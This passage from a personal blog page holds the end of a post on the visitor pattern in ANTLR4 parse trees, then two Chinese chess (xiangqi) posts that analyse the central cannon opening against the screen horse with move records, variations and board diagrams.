    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>到此程序控制流又进入了<code>accept</code>方法中,
只不过这次应该是<code>StatementContext.accept</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class StatementContext</span></span><br><span class="line">		<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitStatement(<span class="built_in">this</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>…</p>
<p>也就是说在具体的访问协议,
比如<code>visitStatement</code>或者<code>visitStatScale</code>等等,
如果程序员有在<code>EvalVisitor</code>中重写, 则调用程序员自定义的</p>
<p>否则调用<code>antlr4</code>在<code>DrawGraphBaseVisitor</code>中生成的默认的</p>
<h5 id="访问器模式总结">访问器模式总结</h5>
<p>1.访问者类的visit接口, 用于与语法树节点类accept接口建立连接,
协商针对该节点的具体访问协议</p>
<p>2.访问者类要知道所有可能的语法树节点类型,
并实现所有具体的访问协议</p>
<p>3.语法树的节点类要实现accept接口,
用于与访问者的visit接口协商本节点的具体访问协议,
告知访问者本节点的具体类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">visitor.visit(node)</span><br><span class="line">	=&gt; node.accept(visitor)</span><br><span class="line">		=&gt; visitor.visitConcrete1(node)</span><br></pre></td></tr></table></figure>
<h3 id="设计模式关系">设计模式关系</h3>
<p>图片来自菜鸟教程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/mmexport1707099938077.png"
alt="设计模式之间的关系" />
<figcaption aria-hidden="true">设计模式之间的关系</figcaption>
</figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/11/[%E7%96%91%E5%BD%A2%E6%8E%A8%E6%BC%94]%20%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%E5%AF%B9%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/11/%5B%E7%96%91%E5%BD%A2%E6%8E%A8%E6%BC%94%5D%20%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%E5%AF%B9%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/" class="post-title-link" itemprop="url">中炮过河车互进七兵对屏风马左马盘河  红七路马 黑盘河马踩三兵 疑形推演</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-11 03:10:00 / Modified: 04:00:32" itemprop="dateCreated datePublished" datetime="2025-04-11T03:10:00+08:00">2025-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1
id="疑形推演-中炮过河车互进七兵对屏风马左马盘河---红七路马-黑盘河马踩三兵">[疑形推演]
中炮过河车互进七兵对屏风马左马盘河 - 红七路马 黑盘河马踩三兵</h1>
<h2 id="对局记录">对局记录</h2>
<ol type="1">
<li><p>炮二平五 马８进７</p></li>
<li><p>马二进三 卒７进１</p></li>
<li><p>车一平二 车９平８</p></li>
<li><p>车二进六 马２进３</p></li>
<li><p>兵七进一 马７进６</p></li>
<li><p>马八进七 马６进７ ？</p></li>
<li><p>炮八进四 象７进５ ？</p></li>
<li><p>炮五进四 士 4 进 5 ？</p></li>
</ol>
<h2 id="复盘分析">复盘分析</h2>
<ol type="1">
<li>炮二平五 马８进７</li>
<li>马二进三 卒７进１</li>
<li>车一平二 车９平８</li>
<li>车二进六 马２进３</li>
<li>兵七进一 马７进６</li>
<li>马八进七 ...</li>
</ol>
<blockquote>
<p>到此双方走的都是正着，形成了中炮过河车互进七兵对屏风马左马盘河 -
红七路马 局面</p>
<p>此时黑方应该飞象3进5等一手，</p>
</blockquote>
<ol start="6" type="1">
<li>马八进七 马６进７</li>
</ol>
<blockquote>
<p>黑盘河马先踩红三兵得一个实惠，然而也就失去了冲7卒踩红车的反击，黑左路留下了无根车炮被牵制。</p>
<p>并且此时黑方中路空虚， 红方立刻进攻黑方中路。有（1）炮八进四
（2）马七进六（3）兵五进一 三种走法</p>
<p>（1）炮八进四</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410222650589.png" alt="image-20250410222650589" style="zoom:50%;" /></p>
<p>红方的目的是给黑方打空头炮， 此时黑方3卒和5卒都挺不起来。</p>
<p>黑方应马7进5换掉红中炮，如此红方中路攻势锐减。此后的变化：</p>
<ol start="7" type="1">
<li><p>炮八进四 马7进5</p></li>
<li><p>象七进五 象7进5
（或者车1进1，区别不是很大，黑先出车并不会得到什么先手）</p></li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410224605022.png" alt="image-20250410224605022" style="zoom:50%;" /></p>
<p>此局面下黑方右马看似有左炮为根，但是左炮后面拉着车，是个哑炮。</p>
<p>因此红方的进攻矛头就是黑右马，如何进攻黑右马？如果红马能踩踏黑中卒，就可以打到黑马。</p>
<p>因此接下来红马三进四，马七进六直取黑中路</p>
<ol start="9" type="1">
<li><p>马三进四 车1进1</p></li>
<li><p>马四进五 ...</p></li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410224742766.png" alt="image-20250410224742766" style="zoom:50%;" /></p>
<p>此局面下黑右马受攻，黑方应法有马3进5/车1平3/车1平8</p>
<p><strong>&lt;1&gt;</strong> 如果黑走🐎3进5：</p>
<ol start="10" type="1">
<li><p>马四进五 马3进5</p></li>
<li><p>炮八平五 士4进5， 此处黑补花士象比较好，否则左侧太空了</p></li>
</ol>
<p>此局面下红方的进攻思路有两种：</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410230214598.png" alt="image-20250410230214598" style="zoom: 50%;" /></p>
<p>I.⚡其一是出左直车先手抓炮，然后进到卒林准备杀3卒，对黑底象施加压力。</p>
<p>如果黑方躲2路炮则红方立刻沉底车，先手叫铁门栓，</p>
<p>黑方要么出将，要么车1平3死守，</p>
<p>红马闲庭信步上就完了，目标黑中象</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410231222464.png" alt="黑平2炮，红沉底车" style="zoom: 67%;" /></p>
<p>因此此处黑方正手是车8平7，不能躲炮。</p>
<p>那么红还是两条路线，要么车八进六再平七，要么就冲中兵缓进。</p>
<ol start="2" type="I">
<li><p>🐌其二是冲中兵，盘中马， 徐图进展</p></li>
<li><p>💀千万不可马七进六，会遭到黑车1平4反击，此时红马没有好去处，更不可冲动踩3卒，黑可以立刻车4进2然后炮2进1硬吃红中炮，红方立刻崩盘</p></li>
</ol>
<p><strong>&lt;2&gt;</strong>如果黑走🚗1平3</p>
<ol start="10" type="1">
<li>马四进五 车1平3</li>
</ol>
<p>此时红方有多种走法，一是马五进三换马，二是不急着换马。
换马并不好，黑方在3路车卒配合下有反击，红方需要冲中兵盘中马防御</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410234145196.png" alt="image-20250410234145196" style="zoom:50%;" /></p>
<p>此时红方应该不予理睬，冲中兵或者进左马盘河或者出左横车均可以。
​但是出左边车马没有明确打击目标，不如冲中兵徐图进展。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410234625162.png" alt="image-20250410234625162" style="zoom:50%;" /></p>
<p><strong>&lt;3&gt;</strong> 如果黑走🚗1平8</p>
<p>黑方的目的是用霸王车解决左翼无根车炮问题，显然如果黑方解开了对红方不利</p>
<ol start="10" type="1">
<li><p>马四进五 车1平8</p></li>
<li><p>马五进三 前车平7</p></li>
<li><p>马三退四</p></li>
</ol>
<p>红方成功骚扰黑方的霸王车计划，调整马位准备进六，接下来有挂角和瞄2路炮过七兵两个进攻矛头。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411000125937.png" alt="image-20250411000125937" style="zoom:50%;" /></p>
<p>（1）黑方如果执意要走霸王车，车8进1</p>
<p>红马四进六，准备挂角抽车，同时红马瞪着黑2路炮，红七兵渡河时机已到
此时黑方只有落象才能同时解决两个问题 红炮八退一，准备再平五立空头炮.
由于红马随时挂角抽车，黑方右炮必须防守住挂角点，因此黑无法补中象
到此黑方已经无力抵抗了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411000652703.png" alt="image-20250411000652703" style="zoom:50%;" /></p>
<p>（2）黑方没有比较好的走法，只能走车7平6.</p>
<p>红马四进六，还是要过七兵 黑只能炮2退1或者退2 慢慢冲中兵就可以了</p>
<p>如果在第7回合黑马没有换掉红中炮，也就是实战黑的走法。</p>
</blockquote>
<blockquote>
<p>（2）马七进六</p>
<ol start="7" type="1">
<li>马七进六 车1进1 ，这里黑方并没有立刻补象，勾引红方立刻进攻</li>
</ol>
<p>此时红河口马，中炮，右车对黑中卒虎视眈眈，但是黑中卒只有一批右马防御，势单力薄。</p>
<p>I. 红方想立刻马六进五，等黑马3进5换马，红炮五进四立上空头炮。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411002210999.png" alt="image-20250411002210999" style="zoom:50%;" /></p>
<p>然而这只是红方一厢情愿</p>
<p>当红马四进五后，黑马7进5，把红最具有威胁的中炮换掉，如果红方不理睬黑马，则马5进3卧槽抽车。因此红必须飞象吃马，此时黑马3进5换马，红车二平五换马。</p>
<p>黑方顺势炮8平5还架中炮，解决了左路无根车炮问题。双方势均力敌，黑方足以满意。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411002629216.png" alt="image-20250411002629216" style="zoom:50%;" /></p>
<ol start="2" type="I">
<li>因此时机尚未成熟，如果红方还想要维持中路攻势，还是得走炮八进四，这样就走到了和先走炮八进四同样的局面。然而此时红方除了炮八进四，还有两种进攻手段，但是都不理想。</li>
</ol>
<p>a.炮五退一 （避免红马前进激战时后炮起火）</p>
<p>b.兵七进一 （基于黑车1进1，底象失守）</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411004154916.png" alt="image-20250411004154916" style="zoom: 50%;" /></p>
<p>a,炮五退一</p>
<p>炮五退一就是预见到当红马六进五时，黑先不换马，二是先马7进5换炮。
因此红方先退避三舍，避免黑马换炮。</p>
<pre><code>  8.    炮五退一 象7进5     

  9.    马六进五 马3进5

  10.    炮五进五 士4进5</code></pre>
<p>到此红立了一个中炮，但是黑车出的快，红方略微优势，前路漫长</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411005646904.png" alt="image-20250411005646904" style="zoom:50%;" /></p>
<p>b.兵七进一</p>
<p>红方想的是黑车离开底线，底象没人管，先送一个兵然后套炮打马打象。</p>
<p>黑方马退窝心时中炮再打过去立当头炮。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411010031184.png" alt="image-20250411010031184" style="zoom: 67%;" /></p>
<p>然而黑方7马随时可以换掉中炮，化解红方中炮攻势</p>
<ol start="8" type="1">
<li><p>兵七进一 卒3进1</p></li>
<li><p>炮八平七 马7进5！</p></li>
<li><p>马六退五！ 马3退5</p></li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411010618723.png" alt="image-20250411010618723" style="zoom:50%;" /></p>
<p>注意到第10回合红方没有用相飞马，而是盘河马杀回来，</p>
<p>这是因为黑有车1平4对抓马的手段。</p>
<p>红方如果用相飞马，黑方应该立刻对抓马。利用这个对抓，黑方可以获得一些先手。</p>
<p>若黑方软弱走马3退5，则红马六进五蹬鼻子上脸优势巨大</p>
</blockquote>
<blockquote>
<p>(3)兵五进一</p>
<p>红方采用急进中兵的思路。</p>
<p>急进中兵局面如右图所示，而当前局面如左图所示。</p>
<p>左图中红方左马已经跳起，黑左马以离开防务，屏风马结构遭到破坏，2路无根车炮被牵制。</p>
<p>因此相比于急进中兵标准棋谱，当前局面下红方的优势更大。</p>
<p>如果说急进中兵双方各有千秋，那么当前局面下红方的千秋貌似更多一点。</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411011902184.png"
alt="左：当前局面 右：急进中兵" />
<figcaption aria-hidden="true">左：当前局面 右：急进中兵</figcaption>
</figure>
<ol start="7" type="1">
<li><p>兵五进一 士4进5，
此时不能马7退5踩兵因为红可以炮八进二打死马</p></li>
<li><p>马三进五！
象3进5，直接抬横车和出贴身车一样快，能多上步象更好</p></li>
<li><p>兵五进一 ...</p></li>
</ol>
<p>此时黑方有两种走法，卒5进1/车1平4</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411014313402.png" alt="image-20250411014313402" style="zoom:50%;" /></p>
<p>I.卒5进1</p>
<ol start="9" type="1">
<li><p>兵五进一 卒5进1</p></li>
<li><p>炮五进三 车1平4</p></li>
<li><p>车九进一 车4进6，黑方接下来想要炮2进4打红马</p></li>
<li><p>车九平三！ 马7退5
，红方先抓马，黑方来不及套炮打马，因此红车杀马之后就看住了红马</p></li>
<li><p>炮八进二！ 马5进3，
红炮打马又得到先手，调整了炮位，也阻止了黑2路炮渗透的可能。</p></li>
<li><p>车三进四 将5平4</p></li>
</ol>
<p>至此红方获得巨大优势，接下来车三退一，炮五平四再退二打死马。注意这里黑方可能埋伏一个软件招</p>
<ol start="15" type="1">
<li><p>车三退一 卒1进1，假设黑方随便走了无关紧要的一步</p></li>
<li><p>炮五平四 象5进7！，这步飞象让人很难理解其目的</p></li>
<li><p>炮五退二？ 车4平5！，黑车为什么敢换马？</p></li>
<li><p>马七进五
炮8平5！，原来之前黑方诡异的飞象，是给中炮腾地方，抽吃红二路车</p></li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411020301215.png" alt="image-20250411020301215" style="zoom:67%;" /></p>
<ol start="2" type="I">
<li>车1平4</li>
</ol>
<p>黑抢出车，不管中路</p>
<ol start="9" type="1">
<li><p>兵五进一 车1平4</p></li>
<li><p>兵五进一 车4进6，黑方接下来要炮2进4打马了</p></li>
</ol>
<p>红方看起来有很多走法，</p>
<p>炮八进二/车九进一/炮五平四/兵五进一</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411021152270.png" alt="image-20250411021152270" style="zoom:50%;" /></p>
<p>①
炮八进二是错着，黑马7进6同时踩红马，挂角。红马五进四后黑马6退4挂角将军，请帅上楼。然后黑右马仗势欺人往上跳，红如果吃黑马则黑左侧车炮可以下底威胁</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411021635359.png" alt="image-20250411021635359" style="zoom:50%;" /></p>
<p>②车九进一也是错着，黑方炮2进4得子</p>
<p>③炮五平四是正着，黑来不及套炮，因为红也可以套炮打车</p>
<ol start="11" type="1">
<li>炮五平四
卒3进1，黑看似无棋可走，于是冲3卒活马。然而黑的目的真的是活🐎吗？</li>
</ol>
<p>假设红方没有察觉黑意图，接收了兑兵，先走了兵七进一：</p>
<ol start="12" type="1">
<li><p>兵七进一 象5进3</p></li>
<li><p>炮四退一 车4退5</p></li>
<li><p><strong>车九进一</strong> 炮2进1！，打车！</p></li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411022937850.png" alt="image-20250411022937850" style="zoom:67%;" /></p>
<p>如果红兵五进一，则黑炮2平5将军，然后象3退5白坑一兵</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023115040.png" alt="image-20250411023115040" style="zoom: 67%;" /></p>
<p>如果红车二退三，想要捉一批死马，然而自己成了死车 ​车二退三，马3进5
​车二平三，炮8平7！，打死红车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023216340.png" alt="image-20250411023216340" style="zoom: 67%;" /></p>
<p>那么红在第14回合不走车九进一能挽救吗？
走兵五平六，当炮2进1时，再兵六进一得子不行吗？
然而此时黑中象已经飞离了，腾出了炮位，黑可以平炮将军抽车</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411023534773.png" alt="image-20250411023534773" style="zoom: 67%;" /></p>
<p>这中象什么时候飞离的？</p>
<p>在第11回合时黑卒3进1兑兵，</p>
<p>在第12回合红接收了兑兵，导致黑方飞高象。</p>
<p>这样就理解了黑冲3卒的真正目的，是一个圈套。</p>
<p>一旦红方上套则局势逆转。</p>
<p>第14回合红如果不走车九进一，改走象七进五也可以降低损失，</p>
<p>此时红方平中炮没有将军的先手，</p>
<p>黑需要先躲一步炮，红兵可以再啃一个中士</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411025142742.png" alt="image-20250411025142742" style="zoom: 67%;" /></p>
<p>然而当红飞中象后，黑也知道圈套作用不大了，也不会再炮2进1，</p>
<p>而是改走卒7进1 ，准备平6威胁红炮红马</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411025432076.png" alt="image-20250411025432076" style="zoom: 67%;" /></p>
<p>也就是说第14回合，红抬红车则落入黑方圈套。红飞中象则黑过兵反击。</p>
<p>总之第12回合红接收兑兵就被黑方算计了</p>
<ol start="12" type="1">
<li>炮四进一，车4退6！，注意这里黑车退6，而在刚才的圈套里黑车退5</li>
</ol>
<p>这是为了防止红兵五平六再进一拱到黑车，所以他跑的远一点儿</p>
<p>此时有两种走法：兵五平六/兵七进一</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411024337199.png" alt="image-20250411024337199" style="zoom: 67%;" /></p>
<p>如果走兵七进一，</p>
<ol start="13" type="1">
<li>兵七进一 象5进3，腾出了炮位</li>
</ol>
<p>象七进五 炮2进1，和刚才的圈套一模一样</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411024822521.png" alt="image-20250411024822521" style="zoom: 67%;" /></p>
<p>如果走兵五平六</p>
<ol start="13" type="1">
<li><p>兵五平六 卒3进1</p></li>
<li><p>兵六平七！ 马3退2</p></li>
</ol>
<p>红兵六平七压马是正手，黑3卒并不着急吃，他也冲不下来，因为红四路炮架着呢。而红兵六平七压马就防止了黑马3进4出来骚扰。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411030414492.png" alt="image-20250411030414492" style="zoom: 67%;" /></p>
<ol start="15" type="1">
<li><p>马五进七 卒7进1 ，到此红方已经取得巨大优势</p></li>
<li><p>直接兵五平六行不行？</p></li>
</ol>
<p>为什么一定要先炮四进一赶走黑车再兵五平六？</p>
<p>直接平行不行？</p>
<p>不行！</p>
<ol start="12" type="1">
<li>兵五平六 象5退3！马上就要炮8平5抽红车！红必须补象</li>
<li>象七进五 炮2进4！此时炮打马带将军，红方来不及炮四进一打车了！</li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250411031038939.png" alt="image-20250411031038939" style="zoom: 67%;" /></p>
<p>④兵五进一继续冲</p>
<ol start="11" type="1">
<li>兵五进一 象7进5，黑方必须得飞红兵，否则他狠狠捅进来了受不了</li>
<li>炮八平九 炮2进4？ 假设黑方认为仍然可以套炮打红中马</li>
<li>炮五进五！将5平4</li>
<li>士六进五！炮2平5，
这里红<strong>补士是正确的，补象就坏了</strong>，后面黑可以一马换双象然后双车借将破双士。</li>
<li>马七进五 车4平5</li>
<li>车二平六！士5进4，由于红炮当头，黑将没法回去，只能补士</li>
<li>炮五平七 炮8平3</li>
<li>车六进一 将4平5</li>
<li>车六平七 得回失子</li>
</ol>
</blockquote>
<ol start="7" type="1">
<li><p>炮八进四 象７进５</p></li>
<li><p>炮五进四 士4进5</p></li>
</ol>
<blockquote>
<p>接下来红方为了保持攻势，应该炮五退一，避免马踩。<strong>同时一个新的作战计划浮出水面。</strong></p>
<p>如果这一步黑方没有察觉，比如随手抬右横车，则红兵七进一，引诱黑卒3进1白得一兵。</p>
<p>炮八平三，打马</p>
<p>卒7进1，看马</p>
<p>车二进一，硬砍炮，如果黑车8进2杀红车则红炮三进三，天地炮闷宫。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410222421895.png" alt="image-20250410222421895" style="zoom: 67%;" /></p>
<p>完整推演：</p>
<ol start="9" type="1">
<li><p>炮五退一 车1进1？</p></li>
<li><p>兵七进一！ 卒3进1</p></li>
<li><p>炮八平三！卒7进1</p></li>
<li><p>车二进一！ 车8平7</p></li>
<li><p>炮三进一！打串！</p></li>
</ol>
<p>也就是说第9回合，黑方必须走出关键的一步，马3退4，形成担子炮不怕红二路车杀炮了。</p>
<p>然而这步我是想不到的。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/11/[%E8%B1%A1%E6%A3%8B%E5%A4%8D%E7%9B%98]%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%20%E5%AF%B9%20%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/11/%5B%E8%B1%A1%E6%A3%8B%E5%A4%8D%E7%9B%98%5D%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%20%E5%AF%B9%20%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/" class="post-title-link" itemprop="url">中炮过河车互进七兵 对 屏风马左马盘河 红七路马 复盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-11 03:00:00 / Modified: 03:36:20" itemprop="dateCreated datePublished" datetime="2025-04-11T03:00:00+08:00">2025-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="复盘-中炮过河车互进七兵-对-屏风马左马盘河---红七路马">[复盘]
中炮过河车互进七兵 对 屏风马左马盘河 - 红七路马</h1>
<h2 id="对局记录">对局记录</h2>
<ol type="1">
<li>炮二平五 马８进７</li>
<li>马二进三 卒７进１</li>
<li>车一平二 车９平８</li>
<li>车二进六 马２进３</li>
<li>兵七进一 马７进６</li>
<li>马八进七 卒７进１</li>
<li>车二平四 马６进８</li>
<li>兵三进一 马８进７</li>
<li>炮五进四 马３进５</li>
<li>车四平五 炮８平５</li>
<li>炮八平三 炮２进１</li>
<li>车五退二 炮２退２</li>
<li>相七进五 炮２平５</li>
<li>车五平四 车１平２</li>
<li>车九进一 象７进９</li>
<li>车九平六 车２进６</li>
<li>车四平六 后炮进５</li>
<li>马七进五 士６进５</li>
<li>后车进二 车２进２</li>
<li>仕六进五 车８进６</li>
<li>马五进四 车２进１</li>
<li>后车退三 车２平４</li>
<li>帅五平六 炮５平４</li>
<li>车六平五 车８平１</li>
<li>马四进二 车１进３</li>
<li>帅六进一 炮４退１</li>
<li>马二进四</li>
</ol>
<h2 id="复盘分析">复盘分析</h2>
<ol type="1">
<li>炮二平五 马８进７</li>
<li>马二进三 卒７进１</li>
<li>车一平二 车９平８</li>
<li>车二进六 马２进３</li>
<li>兵七进一 马７进６</li>
<li>马八进七 …</li>
</ol>
<blockquote>
<p>到此, 双方都一直走的正着, 至此形成局面
<strong>中炮过河车互进七兵对屏风马左马盘河 — 红七路马</strong></p>
<p>在此局面下, 如果我执黑方, 我可能的走法有:</p>
<p>(1)卒7进1 , 也就是实战中的下法</p>
<p>(2)马6进7 , 红可左马盘河, 联合中炮攻击中卒,
并且黑马6进7可能最大的作用就是换掉中炮, 比较亏步数</p>
<p>(3)象3进5 , 可以走</p>
<p>(4)象7进5 , 可以走</p>
<p>(5)车1进1 , 可以走</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408164518149.png"
alt="image-20250408164518149" />
<figcaption aria-hidden="true">image-20250408164518149</figcaption>
</figure>
<p>实战中红方采用马八进七, 目的是不让黑马6进4.</p>
<p>这里红上马看似顾此失彼, 引诱黑方走卒7进1这步棋,
想的是蹬车同时过兵反击. 然而这是红方设计的布局陷阱.</p>
<p><a
target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Z4411R7xh?vd_source=439dc31ae7afb665ee549d8bb78a939c&amp;p=3&amp;spm_id_from=333.788.videopod.episodes">2-2
黑主要变例（上）--黑劣变的攻击_哔哩哔哩_bilibili</a></p>
<p>这里黑方正手是补一下7象或者3象 中路加厚一层就可以破解红方的陷阱,
或者不予理睬抬右横车</p>
<p>实战黑方没有补象, 直接冲7卒反击, 时机尚未成熟,
缺一手补象使得黑中路有被炮轰空头或者车杀卒将军的风险.</p>
</blockquote>
<ol start="6" type="1">
<li>马八进七 卒７进１</li>
</ol>
<blockquote>
<p>这里黑方冲7卒反击, 时机尚未成熟, 黑中防并不踏实</p>
</blockquote>
<ol start="7" type="1">
<li>车二平四 马６进８</li>
</ol>
<blockquote>
<p>这里貌似红三路兵马十分被动,然而实际不然, 红可以直接挺三兵, 弃三马.
接下来炮轰中卒</p>
<p>​ 如果黑3马换掉中炮, 那么车杀马带将军, 红左炮抽回失子</p>
<p>​ 如果黑3马不换中炮, 那么黑还需要花费一步棋逃走7马,
红方弃掉一马得到一个空头炮, 红大优</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408181346573.png"
alt="image-20250408181346573" />
<figcaption aria-hidden="true">image-20250408181346573</figcaption>
</figure>
</blockquote>
<ol start="8" type="1">
<li>兵三进一 马８进７</li>
<li>炮五进四 马３进５</li>
<li>车四平五 炮８平５</li>
</ol>
<blockquote>
<p>黑这步平炮是错招, 本来黑还有炮8进7的反击手段. 甚至不如炮2平5.</p>
<p>当时黑方应该是想平8炮亮车然后抬车欺负红车.
应该是杀红眼了想立刻发泄一下.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408184749466.png"
alt="image-20250408184749466" />
<figcaption aria-hidden="true">image-20250408184749466</figcaption>
</figure>
<p>黑方正手应该走士6进5, 保留右炮平中或者左移的变化.
并可以在红右翼反击.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408185345530.png"
alt="image-20250408185345530" />
<figcaption aria-hidden="true">image-20250408185345530</figcaption>
</figure>
</blockquote>
<ol start="11" type="1">
<li>炮八平三 炮２进１</li>
</ol>
<blockquote>
<p>此局面下, 红中路空虚, 中车不能离开, 只能退一或者退二避让.</p>
<p>当时走了退二, 没走退一, 是害怕黑车8进4再捉, 会帮助黑方出车.</p>
<p>然而实际上不用怕, 红可炮轰底象然后再退四格挡</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408190114485.png"
alt="image-20250408190114485" />
<figcaption aria-hidden="true">image-20250408190114485</figcaption>
</figure>
</blockquote>
<ol start="12" type="1">
<li><p>车五退二 炮２退２</p></li>
<li><p>相七进五 炮２平５</p></li>
<li><p>车五平四 车１平２</p></li>
<li><p>车九进一 象７进９</p></li>
</ol>
<blockquote>
